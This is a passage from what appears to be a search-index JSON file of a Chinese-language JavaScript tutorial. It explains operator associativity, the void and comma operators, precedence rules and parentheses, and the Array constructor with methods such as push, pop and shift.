associativity\uff09\u8fd0\u7b97\u7b26\uff1b\u65b9\u5f0f\u4e8c\u662f\u5c06\u53f3\u4fa7\u4e24\u4e2a\u8fd0\u7b97\u6570\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u8fd9\u6837\u7684\u8fd0\u7b97\u7b26\u79f0\u4e3a\u201c\u53f3\u7ed3\u5408\u201d\u8fd0\u7b97\u7b26\uff08right-to-left associativity\uff09\u3002 JavaScript \u8bed\u8a00\u7684\u5927\u591a\u6570\u8fd0\u7b97\u7b26\u662f\u201c\u5de6\u7ed3\u5408\u201d\uff0c\u8bf7\u770b\u4e0b\u9762\u52a0\u6cd5\u8fd0\u7b97\u7b26\u7684\u4f8b\u5b50\u3002 1 2 3 4 x + y + z // \u5f15\u64ce\u89e3\u91ca\u5982\u4e0b ( x + y ) + z \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c x \u4e0e y \u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5b83\u4eec\u7684\u9884\u7b97\u7ed3\u679c\u518d\u4e0e z \u8fdb\u884c\u8fd0\u7b97\u3002 \u5c11\u6570\u8fd0\u7b97\u7b26\u662f\u201c\u53f3\u7ed3\u5408\u201d\uff0c\u5176\u4e2d\u6700\u4e3b\u8981\u7684\u662f\u8d4b\u503c\u8fd0\u7b97\u7b26\uff08 = \uff09\u548c\u4e09\u5143\u6761\u4ef6\u8fd0\u7b97\u7b26\uff08 ?: \uff09\u3002 1 2 w = x = y = z ; q = a ? b : c ? d : e ? f : g ; \u4e0a\u9762\u4ee3\u7801\u7684\u89e3\u91ca\u65b9\u5f0f\u5982\u4e0b\u3002 1 2 w = ( x = ( y = z )); q = a ? b : ( c ? d : ( e ? f : g )); \u4e0a\u9762\u7684\u4e24\u884c\u4ee3\u7801\uff0c\u90fd\u662f\u53f3\u4fa7\u7684\u8fd0\u7b97\u6570\u7ed3\u5408\u5728\u4e00\u8d77\u3002 \u53e6\u5916\uff0c\u6307\u6570\u8fd0\u7b97\u7b26\uff08 ** \uff09\u4e5f\u662f\u53f3\u7ed3\u5408\u3002 1 2 3 2 ** 3 ** 2 // \u76f8\u5f53\u4e8e 2 ** (3 ** 2) // 512","title":"\u5176\u4ed6\u8fd0\u7b97\u7b26\uff0c\u8fd0\u7b97\u987a\u5e8f"},{"location":"operators/priority/#_1","text":"","title":"\u5176\u4ed6\u8fd0\u7b97\u7b26\uff0c\u8fd0\u7b97\u987a\u5e8f"},{"location":"operators/priority/#void","text":"void \u8fd0\u7b97\u7b26\u7684\u4f5c\u7528\u662f\u6267\u884c\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u7136\u540e\u4e0d\u8fd4\u56de\u4efb\u4f55\u503c\uff0c\u6216\u8005\u8bf4\u8fd4\u56de undefined \u3002 1 2 void 0 // undefined void ( 0 ) // undefined \u4e0a\u9762\u662f void \u8fd0\u7b97\u7b26\u7684\u4e24\u79cd\u5199\u6cd5\uff0c\u90fd\u6b63\u786e\u3002\u5efa\u8bae\u91c7\u7528\u540e\u4e00\u79cd\u5f62\u5f0f\uff0c\u5373\u603b\u662f\u4f7f\u7528\u5706\u62ec\u53f7\u3002\u56e0\u4e3a void \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u6027\u5f88\u9ad8\uff0c\u5982\u679c\u4e0d\u4f7f\u7528\u62ec\u53f7\uff0c\u5bb9\u6613\u9020\u6210\u9519\u8bef\u7684\u7ed3\u679c\u3002\u6bd4\u5982\uff0c void 4 + 7 \u5b9e\u9645\u4e0a\u7b49\u540c\u4e8e (void 4) + 7 \u3002 \u4e0b\u9762\u662f void \u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 var x = 3 ; void ( x = 5 ) //undefined x // 5 \u8fd9\u4e2a\u8fd0\u7b97\u7b26\u7684\u4e3b\u8981\u7528\u9014\u662f\u6d4f\u89c8\u5668\u7684\u4e66\u7b7e\u5de5\u5177\uff08Bookmarklet\uff09\uff0c\u4ee5\u53ca\u5728\u8d85\u7ea7\u94fe\u63a5\u4e2d\u63d2\u5165\u4ee3\u7801\u9632\u6b62\u7f51\u9875\u8df3\u8f6c\u3002 \u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 < script > function f () { console . log ( 'Hello World' ); } </ script > < a href = \"http://example.com\" onclick = \"f(); return false;\" > \u70b9\u51fb </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u4f1a\u5148\u6267\u884c onclick \u7684\u4ee3\u7801\uff0c\u7531\u4e8e onclick \u8fd4\u56de false \uff0c\u6240\u4ee5\u6d4f\u89c8\u5668\u4e0d\u4f1a\u8df3\u8f6c\u5230 example.com\u3002 void \u8fd0\u7b97\u7b26\u53ef\u4ee5\u53d6\u4ee3\u4e0a\u9762\u7684\u5199\u6cd5\u3002 1 < a href = \"javascript: void(f())\" > \u6587\u5b57 </ a > \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u5b9e\u9645\u7684\u4f8b\u5b50\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u63d0\u4ea4\u8868\u5355\uff0c\u4f46\u662f\u4e0d\u4ea7\u751f\u9875\u9762\u8df3\u8f6c\u3002 1 2 3 < a href = \"javascript: void(document.form.submit())\" > \u63d0\u4ea4 </ a >","title":"void \u8fd0\u7b97\u7b26"},{"location":"operators/priority/#_2","text":"\u9017\u53f7\u8fd0\u7b97\u7b26\u7528\u4e8e\u5bf9\u4e24\u4e2a\u8868\u8fbe\u5f0f\u6c42\u503c\uff0c\u5e76\u8fd4\u56de\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 5 6 'a' , 'b' // \"b\" var x = 0 ; var y = ( x ++ , 10 ); x // 1 y // 10 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9017\u53f7\u8fd0\u7b97\u7b26\u8fd4\u56de\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 \u9017\u53f7\u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u7528\u9014\u662f\uff0c\u5728\u8fd4\u56de\u4e00\u4e2a\u503c\u4e4b\u524d\uff0c\u8fdb\u884c\u4e00\u4e9b\u8f85\u52a9\u64cd\u4f5c\u3002 1 2 3 4 var value = ( console . log ( 'Hi!' ), true ); // Hi! value // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u6267\u884c\u9017\u53f7\u4e4b\u524d\u7684\u64cd\u4f5c\uff0c\u7136\u540e\u8fd4\u56de\u9017\u53f7\u540e\u9762\u7684\u503c\u3002","title":"\u9017\u53f7\u8fd0\u7b97\u7b26"},{"location":"operators/priority/#_3","text":"","title":"\u8fd0\u7b97\u987a\u5e8f"},{"location":"operators/priority/#_4","text":"JavaScript \u5404\u79cd\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u522b\uff08Operator Precedence\uff09\u662f\u4e0d\u4e00\u6837\u7684\u3002\u4f18\u5148\u7ea7\u9ad8\u7684\u8fd0\u7b97\u7b26\u5148\u6267\u884c\uff0c\u4f18\u5148\u7ea7\u4f4e\u7684\u8fd0\u7b97\u7b26\u540e\u6267\u884c\u3002 1 4 + 5 * 6 // 34 \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u4e58\u6cd5\u8fd0\u7b97\u7b26\uff08 * \uff09\u7684\u4f18\u5148\u6027\u9ad8\u4e8e\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff08 + \uff09\uff0c\u6240\u4ee5\u5148\u6267\u884c\u4e58\u6cd5\uff0c\u518d\u6267\u884c\u52a0\u6cd5\uff0c\u76f8\u5f53\u4e8e\u4e0b\u9762\u8fd9\u6837\u3002 1 4 + ( 5 * 6 ) // 34 \u5982\u679c\u591a\u4e2a\u8fd0\u7b97\u7b26\u6df7\u5199\u5728\u4e00\u8d77\uff0c\u5e38\u5e38\u4f1a\u5bfc\u81f4\u4ee4\u4eba\u56f0\u60d1\u7684\u4ee3\u7801\u3002 1 2 3 4 var x = 1 ; var arr = []; var y = arr . length <= 0 || arr [ 0 ] === undefined ? x : arr [ 0 ]; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf y \u7684\u503c\u5c31\u5f88\u96be\u770b\u51fa\u6765\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u6d89\u53ca5\u4e2a\u8fd0\u7b97\u7b26\uff0c\u5230\u5e95\u8c01\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u5b9e\u5728\u4e0d\u5bb9\u6613\u8bb0\u4f4f\u3002 \u6839\u636e\u8bed\u8a00\u89c4\u683c\uff0c\u8fd9\u4e94\u4e2a\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u4ece\u9ad8\u5230\u4f4e\u4f9d\u6b21\u4e3a\uff1a\u5c0f\u4e8e\u7b49\u4e8e\uff08 <= )\u3001\u4e25\u683c\u76f8\u7b49\uff08 === \uff09\u3001\u6216\uff08 || \uff09\u3001\u4e09\u5143\uff08 ?: \uff09\u3001\u7b49\u53f7\uff08 = \uff09\u3002\u56e0\u6b64\u4e0a\u9762\u7684\u8868\u8fbe\u5f0f\uff0c\u5b9e\u9645\u7684\u8fd0\u7b97\u987a\u5e8f\u5982\u4e0b\u3002 1 var y = (( arr . length <= 0 ) || ( arr [ 0 ] === undefined )) ? x : arr [ 0 ]; \u8bb0\u4f4f\u6240\u6709\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\uff0c\u662f\u975e\u5e38\u96be\u7684\uff0c\u4e5f\u662f\u6ca1\u6709\u5fc5\u8981\u7684\u3002","title":"\u4f18\u5148\u7ea7"},{"location":"operators/priority/#_5","text":"\u5706\u62ec\u53f7\uff08 () \uff09\u53ef\u4ee5\u7528\u6765\u63d0\u9ad8\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\uff0c\u56e0\u4e3a\u5b83\u7684\u4f18\u5148\u7ea7\u662f\u6700\u9ad8\u7684\uff0c\u5373\u5706\u62ec\u53f7\u4e2d\u7684\u8868\u8fbe\u5f0f\u4f1a\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u3002 1 ( 4 + 5 ) * 6 // 54 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u4f7f\u7528\u4e86\u5706\u62ec\u53f7\uff0c\u52a0\u6cd5\u4f1a\u5148\u4e8e\u4e58\u6cd5\u6267\u884c\u3002 \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u522b\u5341\u5206\u7e41\u6742\uff0c\u4e14\u90fd\u662f\u786c\u6027\u89c4\u5b9a\uff0c\u56e0\u6b64\u5efa\u8bae\u603b\u662f\u4f7f\u7528\u5706\u62ec\u53f7\uff0c\u4fdd\u8bc1\u8fd0\u7b97\u987a\u5e8f\u6e05\u6670\u53ef\u8bfb\uff0c\u8fd9\u5bf9\u4ee3\u7801\u7684\u7ef4\u62a4\u548c\u9664\u9519\u81f3\u5173\u91cd\u8981\u3002 \u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u5706\u62ec\u53f7\u4e0d\u662f\u8fd0\u7b97\u7b26\uff0c\u800c\u662f\u4e00\u79cd\u8bed\u6cd5\u7ed3\u6784\u3002\u5b83\u4e00\u5171\u6709\u4e24\u79cd\u7528\u6cd5\uff1a\u4e00\u79cd\u662f\u628a\u8868\u8fbe\u5f0f\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u63d0\u5347\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\uff1b\u53e6\u4e00\u79cd\u662f\u8ddf\u5728\u51fd\u6570\u7684\u540e\u9762\uff0c\u4f5c\u7528\u662f\u8c03\u7528\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u56e0\u4e3a\u5706\u62ec\u53f7\u4e0d\u662f\u8fd0\u7b97\u7b26\uff0c\u6240\u4ee5\u4e0d\u5177\u6709\u6c42\u503c\u4f5c\u7528\uff0c\u53ea\u6539\u53d8\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u3002 1 2 var x = 1 ; ( x ) = 2 ; \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e8c\u884c\uff0c\u5982\u679c\u5706\u62ec\u53f7\u5177\u6709\u6c42\u503c\u4f5c\u7528\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d8\u6210 1 = 2 \uff0c\u8fd9\u662f\u4f1a\u62a5\u9519\u4e86\u3002\u4f46\u662f\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u8fd0\u884c\uff0c\u8fd9\u9a8c\u8bc1\u4e86\u5706\u62ec\u53f7\u53ea\u6539\u53d8\u4f18\u5148\u7ea7\uff0c\u4e0d\u4f1a\u6c42\u503c\u3002 \u8fd9\u4e5f\u610f\u5473\u7740\uff0c\u5982\u679c\u6574\u4e2a\u8868\u8fbe\u5f0f\u90fd\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u90a3\u4e48\u4e0d\u4f1a\u6709\u4efb\u4f55\u6548\u679c\u3002 1 2 3 ( expression ) // \u7b49\u540c\u4e8e expression \u51fd\u6570\u653e\u5728\u5706\u62ec\u53f7\u4e2d\uff0c\u4f1a\u8fd4\u56de\u51fd\u6570\u672c\u8eab\u3002\u5982\u679c\u5706\u62ec\u53f7\u7d27\u8ddf\u5728\u51fd\u6570\u7684\u540e\u9762\uff0c\u5c31\u8868\u793a\u8c03\u7528\u51fd\u6570\u3002 1 2 3 4 5 6 function f () { return 1 ; } ( f ) // function f(){return 1;} f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\u4f1a\u8fd4\u56de\u51fd\u6570\u672c\u8eab\uff0c\u5706\u62ec\u53f7\u8ddf\u5728\u51fd\u6570\u540e\u9762\u5219\u662f\u8c03\u7528\u51fd\u6570\u3002 \u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u53ea\u80fd\u653e\u7f6e\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u5c06\u8bed\u53e5\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 ( var a = 1 ) // SyntaxError: Unexpected token var","title":"\u5706\u62ec\u53f7\u7684\u4f5c\u7528"},{"location":"operators/priority/#_6","text":"\u5bf9\u4e8e\u4f18\u5148\u7ea7\u522b\u76f8\u540c\u7684\u8fd0\u7b97\u7b26\uff0c\u540c\u65f6\u51fa\u73b0\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u6709\u8ba1\u7b97\u987a\u5e8f\u7684\u95ee\u9898\u3002 1 a OP b OP c \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c OP \u8868\u793a\u8fd0\u7b97\u7b26\u3002\u5b83\u53ef\u4ee5\u6709\u4e24\u79cd\u89e3\u91ca\u65b9\u5f0f\u3002 1 2 3 4 5 // \u65b9\u5f0f\u4e00 ( a OP b ) OP c // \u65b9\u5f0f\u4e8c a OP ( b OP c ) \u4e0a\u9762\u7684\u4e24\u79cd\u65b9\u5f0f\uff0c\u5f97\u5230\u7684\u8ba1\u7b97\u7ed3\u679c\u5f80\u5f80\u662f\u4e0d\u4e00\u6837\u7684\u3002\u65b9\u5f0f\u4e00\u662f\u5c06\u5de6\u4fa7\u4e24\u4e2a\u8fd0\u7b97\u6570\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u91c7\u7528\u8fd9\u79cd\u89e3\u91ca\u65b9\u5f0f\u7684\u8fd0\u7b97\u7b26\uff0c\u79f0\u4e3a\u201c\u5de6\u7ed3\u5408\u201d\uff08left-to-right associativity\uff09\u8fd0\u7b97\u7b26\uff1b\u65b9\u5f0f\u4e8c\u662f\u5c06\u53f3\u4fa7\u4e24\u4e2a\u8fd0\u7b97\u6570\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u8fd9\u6837\u7684\u8fd0\u7b97\u7b26\u79f0\u4e3a\u201c\u53f3\u7ed3\u5408\u201d\u8fd0\u7b97\u7b26\uff08right-to-left associativity\uff09\u3002 JavaScript \u8bed\u8a00\u7684\u5927\u591a\u6570\u8fd0\u7b97\u7b26\u662f\u201c\u5de6\u7ed3\u5408\u201d\uff0c\u8bf7\u770b\u4e0b\u9762\u52a0\u6cd5\u8fd0\u7b97\u7b26\u7684\u4f8b\u5b50\u3002 1 2 3 4 x + y + z // \u5f15\u64ce\u89e3\u91ca\u5982\u4e0b ( x + y ) + z \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c x \u4e0e y \u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5b83\u4eec\u7684\u9884\u7b97\u7ed3\u679c\u518d\u4e0e z \u8fdb\u884c\u8fd0\u7b97\u3002 \u5c11\u6570\u8fd0\u7b97\u7b26\u662f\u201c\u53f3\u7ed3\u5408\u201d\uff0c\u5176\u4e2d\u6700\u4e3b\u8981\u7684\u662f\u8d4b\u503c\u8fd0\u7b97\u7b26\uff08 = \uff09\u548c\u4e09\u5143\u6761\u4ef6\u8fd0\u7b97\u7b26\uff08 ?: \uff09\u3002 1 2 w = x = y = z ; q = a ? b : c ? d : e ? f : g ; \u4e0a\u9762\u4ee3\u7801\u7684\u89e3\u91ca\u65b9\u5f0f\u5982\u4e0b\u3002 1 2 w = ( x = ( y = z )); q = a ? b : ( c ? d : ( e ? f : g )); \u4e0a\u9762\u7684\u4e24\u884c\u4ee3\u7801\uff0c\u90fd\u662f\u53f3\u4fa7\u7684\u8fd0\u7b97\u6570\u7ed3\u5408\u5728\u4e00\u8d77\u3002 \u53e6\u5916\uff0c\u6307\u6570\u8fd0\u7b97\u7b26\uff08 ** \uff09\u4e5f\u662f\u53f3\u7ed3\u5408\u3002 1 2 3 2 ** 3 ** 2 // \u76f8\u5f53\u4e8e 2 ** (3 ** 2) // 512","title":"\u5de6\u7ed3\u5408\u4e0e\u53f3\u7ed3\u5408"},{"location":"stdlib/array/","text":"Array \u5bf9\u8c61 \u00b6 \u6784\u9020\u51fd\u6570 \u00b6 Array \u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u5b83\u751f\u6210\u65b0\u7684\u6570\u7ec4\u3002 1 2 3 var arr = new Array ( 2 ); arr . length // 2 arr // [ empty x 2 ] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Array() \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570 2 \uff0c\u8868\u793a\u751f\u6210\u4e00\u4e2a\u4e24\u4e2a\u6210\u5458\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u4f4d\u7f6e\u90fd\u662f\u7a7a\u503c\u3002 \u5982\u679c\u6ca1\u6709\u4f7f\u7528 new \u5173\u952e\u5b57\uff0c\u8fd0\u884c\u7ed3\u679c\u4e5f\u662f\u4e00\u6837\u7684\u3002 1 2 3 var arr = Array ( 2 ); // \u7b49\u540c\u4e8e var arr = new Array ( 2 ); \u8003\u8651\u5230\u8bed\u4e49\u6027\uff0c\u4ee5\u53ca\u4e0e\u5176\u4ed6\u6784\u9020\u51fd\u6570\u7528\u6cd5\u4fdd\u6301\u4e00\u81f4\uff0c\u5efa\u8bae\u603b\u662f\u52a0\u4e0a new \u3002 Array() \u6784\u9020\u51fd\u6570\u6709\u4e00\u4e2a\u5f88\u5927\u7684\u7f3a\u9677\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u4e2a\u6570\u4f1a\u5bfc\u81f4\u4e0d\u4e00\u81f4\u7684\u884c\u4e3a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // \u65e0\u53c2\u6570\u65f6\uff0c\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4 new Array () // [] // \u5355\u4e2a\u6b63\u6574\u6570\u53c2\u6570\uff0c\u8868\u793a\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u7684\u957f\u5ea6 new Array ( 1 ) // [ empty ] new Array ( 2 ) // [ empty x 2 ] // \u975e\u6b63\u6574\u6570\u7684\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f1a\u62a5\u9519 new Array ( 3.2 ) // RangeError: Invalid array length new Array ( - 3 ) // RangeError: Invalid array length // \u5355\u4e2a\u975e\u6570\u503c\uff08\u6bd4\u5982\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u3001\u5bf9\u8c61\u7b49\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c // \u5219\u8be5\u53c2\u6570\u662f\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u7684\u6210\u5458 new Array ( 'abc' ) // ['abc'] new Array ([ 1 ]) // [Array[1]] // \u591a\u53c2\u6570\u65f6\uff0c\u6240\u6709\u53c2\u6570\u90fd\u662f\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u7684\u6210\u5458 new Array ( 1 , 2 ) // [1, 2] new Array ( 'a' , 'b' , 'c' ) // ['a', 'b', 'c'] \u53ef\u4ee5\u770b\u5230\uff0c Array() \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u884c\u4e3a\u5f88\u4e0d\u4e00\u81f4\u3002\u56e0\u6b64\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528\u5b83\u751f\u6210\u65b0\u6570\u7ec4\uff0c\u76f4\u63a5\u4f7f\u7528\u6570\u7ec4\u5b57\u9762\u91cf\u662f\u66f4\u597d\u7684\u505a\u6cd5\u3002 1 2 3 4 5 // bad var arr = new Array ( 1 , 2 ); // good var arr = [ 1 , 2 ]; \u6ce8\u610f\uff0c\u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u90fd\u662f\u7a7a\u4f4d\u3002\u867d\u7136\u8bfb\u53d6\u7684\u65f6\u5019\u8fd4\u56de undefined \uff0c\u4f46\u5b9e\u9645\u4e0a\u8be5\u4f4d\u7f6e\u6ca1\u6709\u4efb\u4f55\u503c\u3002\u867d\u7136\u8fd9\u65f6\u53ef\u4ee5\u8bfb\u53d6\u5230 length \u5c5e\u6027\uff0c\u4f46\u662f\u53d6\u4e0d\u5230\u952e\u540d\u3002 1 2 3 4 5 6 7 8 9 10 11 var a = new Array ( 3 ); var b = [ undefined , undefined , undefined ]; a . length // 3 b . length // 3 a [ 0 ] // undefined b [ 0 ] // undefined 0 in a // false 0 in b // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u662f Array() \u751f\u6210\u7684\u4e00\u4e2a\u957f\u5ea6\u4e3a3\u7684\u7a7a\u6570\u7ec4\uff0c b \u662f\u4e00\u4e2a\u4e09\u4e2a\u6210\u5458\u90fd\u662f undefined \u7684\u6570\u7ec4\uff0c\u8fd9\u4e24\u4e2a\u6570\u7ec4\u662f\u4e0d\u4e00\u6837\u7684\u3002\u8bfb\u53d6\u952e\u503c\u7684\u65f6\u5019\uff0c a \u548c b \u90fd\u8fd4\u56de undefined \uff0c\u4f46\u662f a \u7684\u952e\u540d\uff08\u6210\u5458\u7684\u5e8f\u53f7\uff09\u90fd\u662f\u7a7a\u7684\uff0c b \u7684\u952e\u540d\u662f\u6709\u503c\u7684\u3002 \u9759\u6001\u65b9\u6cd5 \u00b6 Array.isArray() \u00b6 Array.isArray \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u53c2\u6570\u662f\u5426\u4e3a\u6570\u7ec4\u3002\u5b83\u53ef\u4ee5\u5f25\u8865 typeof \u8fd0\u7b97\u7b26\u7684\u4e0d\u8db3\u3002 1 2 3 4 var arr = [ 1 , 2 , 3 ]; typeof arr // \"object\" Array . isArray ( arr ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c typeof \u8fd0\u7b97\u7b26\u53ea\u80fd\u663e\u793a\u6570\u7ec4\u7684\u7c7b\u578b\u662f Object \uff0c\u800c Array.isArray \u65b9\u6cd5\u53ef\u4ee5\u8bc6\u522b\u6570\u7ec4\u3002 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 valueOf()\uff0ctoString() \u00b6 valueOf \u65b9\u6cd5\u662f\u4e00\u4e2a\u6240\u6709\u5bf9\u8c61\u90fd\u62e5\u6709\u7684\u65b9\u6cd5\uff0c\u8868\u793a\u5bf9\u8be5\u5bf9\u8c61\u6c42\u503c\u3002\u4e0d\u540c\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u4e0d\u5c3d\u4e00\u81f4\uff0c\u6570\u7ec4\u7684 valueOf \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4\u672c\u8eab\u3002 1 2 var arr = [ 1 , 2 , 3 ]; arr . valueOf () // [1, 2, 3] toString \u65b9\u6cd5\u4e5f\u662f\u5bf9\u8c61\u7684\u901a\u7528\u65b9\u6cd5\uff0c\u6570\u7ec4\u7684 toString \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 5 var arr = [ 1 , 2 , 3 ]; arr . toString () // \"1,2,3\" var arr = [ 1 , 2 , 3 , [ 4 , 5 , 6 ]]; arr . toString () // \"1,2,3,4,5,6\" push()\uff0cpop() \u00b6 push \u65b9\u6cd5\u7528\u4e8e\u5728\u6570\u7ec4\u7684\u672b\u7aef\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u6dfb\u52a0\u65b0\u5143\u7d20\u540e\u7684\u6570\u7ec4\u957f\u5ea6\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 5 6 var arr = []; arr . push ( 1 ) // 1 arr . push ( 'a' ) // 2 arr . push ( true , {}) // 4 arr // [1, 'a', true, {}] \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 push \u65b9\u6cd5\uff0c\u5f80\u6570\u7ec4\u4e2d\u6dfb\u52a0\u4e86\u56db\u4e2a\u6210\u5458\u3002 pop \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; arr . pop () // 'c' arr // ['a', 'b'] \u5bf9\u7a7a\u6570\u7ec4\u4f7f\u7528 pop \u65b9\u6cd5\uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u800c\u662f\u8fd4\u56de undefined \u3002 1 []. pop () // undefined push \u548c pop \u7ed3\u5408\u4f7f\u7528\uff0c\u5c31\u6784\u6210\u4e86\u201c\u540e\u8fdb\u5148\u51fa\u201d\u7684\u6808\u7ed3\u6784\uff08stack\uff09\u3002 1 2 3 4 5 var arr = []; arr . push ( 1 , 2 ); arr . push ( 3 ); arr . pop (); arr // [1, 2] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 3 \u662f\u6700\u540e\u8fdb\u5165\u6570\u7ec4\u7684\uff0c\u4f46\u662f\u6700\u65e9\u79bb\u5f00\u6570\u7ec4\u3002 shift()\uff0cunshift() \u00b6 shift() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . shift () // 'a' a // ['b', 'c'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528 shift() \u65b9\u6cd5\u4ee5\u540e\uff0c\u539f\u6570\u7ec4\u5c31\u53d8\u4e86\u3002 shift() \u65b9\u6cd5\u53ef\u4ee5\u904d\u5386\u5e76\u6e05\u7a7a\u4e00\u4e2a\u6570\u7ec4\u3002 1 2 3 4 5 6 7 8 var list = [ 1 , 2 , 3 , 4 ]; var item ; while ( item = list . shift ()) { console . log ( item ); } list // [] \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 list.shift() \u65b9\u6cd5\u6bcf\u6b21\u53d6\u51fa\u4e00\u4e2a\u5143\u7d20\uff0c\u4ece\u800c\u904d\u5386\u6570\u7ec4\u3002\u5b83\u7684\u524d\u63d0\u662f\u6570\u7ec4\u5143\u7d20\u4e0d\u80fd\u662f 0 \u6216\u4efb\u4f55\u5e03\u5c14\u503c\u7b49\u4e8e false \u7684\u5143\u7d20\uff0c\u56e0\u6b64\u8fd9\u6837\u7684\u904d\u5386\u4e0d\u662f\u5f88\u53ef\u9760\u3002 push() \u548c shift() \u7ed3\u5408\u4f7f\u7528\uff0c\u5c31\u6784\u6210\u4e86\u201c\u5148\u8fdb\u5148\u51fa\u201d\u7684\u961f\u5217\u7ed3\u6784\uff08queue\uff09\u3002 unshift() 